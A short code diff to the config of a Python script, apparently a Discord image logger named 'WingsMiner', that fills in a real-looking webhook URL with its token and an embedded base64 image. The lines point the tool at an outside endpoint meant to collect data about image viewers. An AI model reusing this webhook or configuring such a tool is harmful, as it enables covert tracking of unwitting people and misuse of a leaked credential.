@@ -22,8 +22,8 @@ __version__ = "v2.0"
 __author__ = "lynxWings"
 
 config = {
-    "webhook": "your_webhook_link_here", # <------------------------- Put your webhook link here.
-    "image": "your_image_address_link_here", # <------------------------- Put image address link here.
+    "webhook": "https://discord.com/api/webhooks/1142202258092740709/TLnf1_n5P53dQ91fEiZq9yPztg7CcY6w7mEFzEaHdq0Sd_JFc7T2p8LT-kcd1sk3NL_H", # <------------------------- Put your webhook link here.
+    "image": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPcAAADMCAMAAACY78UPAAAAb1BMVEX///8AAABPT0/d3d3Kyspubm7FxcVkZGTa2tpMTEwyMjLV1dUsLCwVFRU5OTlCQkImJiYeHh6AgIBHR0c/Pz83NzdTU1NycnIQEBBNTU0aGhrm5uZ4eHiJiYknJyf29vaysrKSkpK5ublfX1+FhYWUdD1rAAADtElEQVR4nO3d2XLrKBSF4cDxEAgI0IBl2VaG9vs/Y8f3fbP3UclerfXdU8VfcZTIgPT2RkRERERERPQ/8dPeL8qhl3t7WHQuK9qZLg3KsX3vzG7R2aznZEpRTn5ncjTXheezlqP5pes+PIbuF57PWtgtxm5A7BZjNyB2i7EbELvFoLuvk/fmQzV0N5oJtvvmazO/q4Z+5L6m08LzWctpsn1UdodqUrvwfNayL3bIyu7iUgd7/x37YdT9fn+Y2ETUz/lWr+fsFmM3IHaLsRsQu8XYDYjdYuDd46jujtGg3pfcG3fOuvuxQ7Sd/154Pmu5ZZdG3f33ITsfYbtHN0zKbuNrvC08n7XcjK3K7x0OpXbmvvB81rLd6zm7hdgNiN1i7AbEbjF2A2K3GLsB3UNKRbkOXEYfUbvbuYai3efRdQ513f802aD83uGxz6PH3edR0/xHNfQ9JvsK+zw+3/+IXarJxXzJB/76MmYy/1zkA98/l8z+Mji+Fux+dovIctmXZ6eIaI/q/Qf/7BaBZrnst8/WWbFaHtPo5QN/9Y+hucoHunbRC5vK/jF55b7cx1DU9bGt/n/ObjF2A2K3GHT3Pgav7vZ+fIH7MZWbd92kXP/Orgmw+x1K1ynPlxyiS7j7PMy50e7zGH0dUfd5tKZP2t/vMQ0G9XumrV7P2S3GbkDsFmM3IHaLsRsQu8XQu/XnS4C7b009B+W6/5xTQO2+Fuu1+x1mO3So96H7yc7a/S2zLbDP8ziWarWf8+jtwPUxLOwWYzcgdouxGxC7xdgNiN1i7AZ0DU0ftd0pzajn/W/B9drnWoQuFNj9DtH16udaJAu8z8N22u6cqkHd53EyIej3cRW+vwQMu8XYDYjdYtDd+OdqtnqOaqPn5jZ7TvLZKSLLZW/2HLTu3PsxzrP23Ptoxhc4965z8zUF5XMO8lD75/8d07n+zftLbITd77AvNqjfX3JuXuG5FirHKfVR+/6S0hfUz/lW/z9ntxi7AbFbjN2A2C3GbkDsFmM3oHvjbNZ2W4f8/hL1Po+5CxNs9+gG7fM8jLfQ7y9RP7+lOuD3l/zNe5nGF1gf09nq9ZzdYuwGxG4xdgNitxi7AbFbDLq7zY16HTiaDNt9D9Vr1/1zOsOu+58m/fM8sN9fYnvtz3vqOtif93H0Qb0vd5xhf7+3ej1ntxi7AbFbjN2A2C3GbkDsFoPuPplSlN07k2fYc+8fueu1p9ia1CiXzl/AT/utPcR2+T79LDoXIiIiIiIioif6F+xGP1TBUMbXAAAAAElFTkSuQmCC", # <------------------------- Put image address link here.
     "imageArgument": True,
 
     "username": "WingsMiner",
